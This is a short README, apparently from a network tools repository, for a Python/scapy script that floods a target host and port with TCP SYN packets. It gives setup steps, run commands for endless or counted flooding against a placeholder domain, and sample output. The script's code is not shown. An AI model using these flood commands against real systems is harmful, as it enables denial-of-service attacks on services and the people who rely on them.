# TCP/SYN Flooding

Script to SYN packages (_via TCP_) ports. Optional to set the number of packages.

## Prepare environment

- you can use Python virtualenv
- Python3.x is needed
- root rights required (_or via sudo_)

```shell
# install needed packages
$ sudo apt install python3-pip python3-venv
# or
$ sudo pip3 install virtualenv

# create and change into Project directory
$ mkdir -p ~/Projects/TCPSYNFlood && cd ~/Projects/TCPSYNFlood

# create virtualenv
$ virtualenv -p python3 venv
# or
$ python3 -m venv venv

# activate virtualenv
$ . venv/bin/activate

# install requirements
(venv) $ pip install -r requirements.txt
# or
(venv) $ pip install scapy

# list packages (optional)
(venv) $ pip freeze

# make file executable
(venv) $ chmod u+x TCPSYNFlood.py
```

## Run TCP/SYN Flooder

just run it...

```shell
# show help (optional)
(venv) $ sudo venv/bin/python ./TCPSYNFlood.py --help

# start infinite flooding
(venv) $ sudo venv/bin/python ./TCPSYNFlood.py mydomain.tld -p 443

# send 25 packages
(venv) $ sudo venv/bin/python ./TCPSYNFlood.py mydomain.tld -p 443 -c 25
```

to interrupt press [CTRL + c]

## Example output

some example from my terminal...

```shell
Send 5 packages to port 80 on target mydomain.tld
Send package 0
Send package 1
Send package 2
Send package 3
Send package 4
All 5 packets successfully sent.
```

[Go back](../README.md)
